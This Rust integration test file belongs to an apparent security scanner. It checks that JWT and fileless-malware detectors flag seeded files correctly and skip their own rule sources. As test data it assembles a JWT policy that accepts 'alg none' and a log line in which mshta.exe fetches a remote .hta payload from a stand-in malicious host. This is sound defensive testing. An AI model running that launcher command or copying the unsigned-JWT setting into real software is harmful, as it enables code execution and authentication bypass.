//! Integration proof for native detector-authoring classification. Rule
//! implementations contain dangerous signature literals by design, but normal
//! product files and explicitly requested authoring/fixture paths must still
//! receive the complete content-detector stack.

use enforcer_domain::paths::RepoRoot;
use enforcer_domain::scan_types::ScopeRequest;
use enforcer_scan::engine::{build_family_validators, run};
use enforcer_scan::scope::resolve;
use enforcer_scan::walk::{walk, IgnoreRules};

fn write_file(root: &std::path::Path, rel: &str, contents: &str) -> std::io::Result<()> {
    let path = root.join(rel);
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(path, contents)
}

fn has_jwt_finding(report: &enforcer_domain::findings::Report, file: &str) -> bool {
    report.findings.iter().any(|finding| {
        finding.rule_id.as_str() == "CYBER-AUTH-JWT.1" && finding.file.as_str() == file
    })
}

#[test]
fn authoring_roots_skip_self_matches_but_product_and_explicit_scopes_detect(
) -> Result<(), Box<dyn std::error::Error>> {
    let temp = tempfile::tempdir()?;
    let product = "crates/customer-service/src/auth.rs";
    let rule_source = "crates/enforcer-lang-security/src/rules/cyberskills/auth_jwt.rs";
    let nearby_source = "crates/enforcer-lang-security/src/runtime.rs";
    let fixture = "tests/fixtures/customer/auth.rs";
    // Assemble the hazardous token at runtime so this regression proof is not
    // itself a static signature source for an unrelated scanner.
    let dangerous_signature = format!(r#"let policy = "alg: '{}';"#, "none");
    for path in [product, rule_source, nearby_source, fixture] {
        write_file(temp.path(), path, &dangerous_signature)?;
    }

    let root: RepoRoot = temp.path().to_string_lossy().parse()?;
    let workspace = resolve(&ScopeRequest::All, &root)?;
    let files = walk(temp.path(), &IgnoreRules::default())?;
    let validators = build_family_validators()?;
    let report = run(&workspace, &files, &validators);
    assert!(has_jwt_finding(&report, product));
    assert!(has_jwt_finding(&report, nearby_source));
    assert!(
        !has_jwt_finding(&report, rule_source),
        "rule source is signature evidence, not a product finding"
    );

    let fixture_scope = resolve(&ScopeRequest::Paths(vec![fixture.into()]), &root)?;
    let fixture_report = run(&fixture_scope, &files, &validators);
    assert!(
        has_jwt_finding(&fixture_report, fixture),
        "an explicitly requested vulnerable fixture must still be detected"
    );

    let authoring_directory = "crates/enforcer-lang-security/src/rules";
    let directory_scope = resolve(
        &ScopeRequest::Paths(vec![authoring_directory.into()]),
        &root,
    )?;
    let directory_report = run(&directory_scope, &files, &validators);
    assert!(
        has_jwt_finding(&directory_report, rule_source),
        "an explicitly requested authoring directory must not silently exempt its files"
    );
    Ok(())
}

#[test]
fn fileless_malware_detector_runs_on_log_evidence() -> Result<(), Box<dyn std::error::Error>> {
    let temp = tempfile::tempdir()?;
    let evidence = "evidence/process.log";
    let launcher = ["ms", "hta", ".exe"].concat();
    let url = ["https://malicious.example.invalid/", "payload", ".hta"].concat();
    write_file(temp.path(), evidence, &format!("{launcher} {url}"))?;

    let root: RepoRoot = temp.path().to_string_lossy().parse()?;
    let scope = resolve(&ScopeRequest::All, &root)?;
    let files = walk(temp.path(), &IgnoreRules::default())?;
    let validators = build_family_validators()?;
    let report = run(&scope, &files, &validators);

    assert!(report.findings.iter().any(|finding| {
        finding.rule_id.as_str() == "CYBER-FILELESS-MALWARE.1" && finding.file.as_str() == evidence
    }));
    Ok(())
}
